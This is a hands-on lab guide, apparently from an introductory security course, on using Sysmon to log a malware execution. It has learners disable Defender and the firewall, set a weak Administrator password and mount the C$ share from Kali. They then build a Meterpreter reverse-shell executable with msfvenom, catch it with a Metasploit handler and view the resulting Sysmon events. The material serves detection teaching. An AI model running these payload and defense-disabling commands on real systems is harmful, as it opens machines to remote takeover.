# Sysmon

Let’s disable **Defender**. Simply run the following from an **Administrator PowerShell** prompt:

![](attachments/OpeningPowershell.png)

Next, run the following command in the **Powershell** terminal:

<pre>Set-MpPreference -DisableRealtimeMonitoring $true</pre>

![](attachments/applocker_disabledefender.png)
This will disable **Defender** for this session.

If you get angry red errors, that is **Ok**, it means **Defender** is not running.

Next, lets ensure the firewall is disabled. In a Windows Command Prompt.

<pre> netsh advfirewall set allprofiles state off</pre>


Next, set a password for the Administrator account that you can remember

<pre>net user Administrator password1234</pre>

Please note, that is a very bad password.  Come up with something better. But, please remember it.

Before we move on from our Powershell window, lets get our IP by running the following command:

<pre>ipconfig</pre>

![](attachments/powershellipconfig.png)

**REMEMBER - YOUR IP WILL BE DIFFERENT**

Write this IP down so we can use it again later.

Let's continue by opening a **Kali** terminal

![](attachments/OpeningKaliInstance.png)

Alternatively, you can click on the **Kali** icon in the taskbar.

![](attachments/TaskbarKaliIcon.png)


We need to run the following commands in order to mount our remote system to the correct directory:

<pre>sudo su -</pre>

<pre>mount -t cifs //[Your IP Address]/c$ /mnt/windows-share -o username=Administrator,password=password1234</pre>

**REMEMBER - YOUR IP ADDRESS AND PASSWORD WILL BE DIFFERENT.**

If you see the following error, it means that the device is already mounted.

![](attachments/mounterror.png)

If this is the case, ignore it.

Run the following command to navigate into the mounted directory:

<pre>cd /mnt/windows-share</pre>

Run the following commands to start a simple backdoor and backdoor listener: 

<pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your IP Address] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe</pre>

Let's start the **Metasploit** Handler.  Open a new **Kali** terminal by clicking the **Kali** icon in the taskbar.

![](attachments/TaskbarKaliIcon.png)

Let's become root.

<pre>sudo su -</pre>

Now let's start the **Metasploit** Handler

<pre>msfconsole -q</pre>

We are going to run the following commands to correctly set the parameters:

<pre>use exploit/multi/handler</pre>

<pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>

<pre>set LHOST [Your IP Address]</pre>

Remember, **Your IP will be different!**

<pre>exploit</pre>

It should look like this:

![](attachments/msfconsole.png)

We will need to open a **"cmd.exe"** terminal as **Administrator**.

![](attachments/OpeningWindowsCommandPrompt.png)

<pre>cd \IntroLabs</pre>

<pre>Sysmon64.exe -accepteula -i sysmonconfig-export.xml</pre>

It should look like this:

![](attachments/sysmonexe.png)

let's run the following commands to run the **"TrustMe.exe"** file.

<pre>cd \</pre>
 
Then run it with the following:

 <pre>TrustMe.exe</pre>

Back at your Kali terminal, you should have a metasploit session!

![](attachments/meterpretersession.png)

Now, we need to view the Sysmon events for this malware:

Open **"Event Viewer"** by pressing the Windows key and searching for it.

![](attachments/eventviewer.png)

You will select Event Viewer > Applications and Services Logs > Microsoft > Windows > Sysmon > Operational

![](attachments/eventviewernav1.png)

You'll have to scroll down a bit until you find the **Sysmon** folder.  

![](attachments/eventviwernav2.png)

Start at the top and work down through the logs, you should see your **malware** executing.  Please note your paths may be different.

![](attachments/logs.png)

![](attachments/processcreateview.png)

***

[Back to Navigation Menu](/IntroClassFiles/navigation.md)
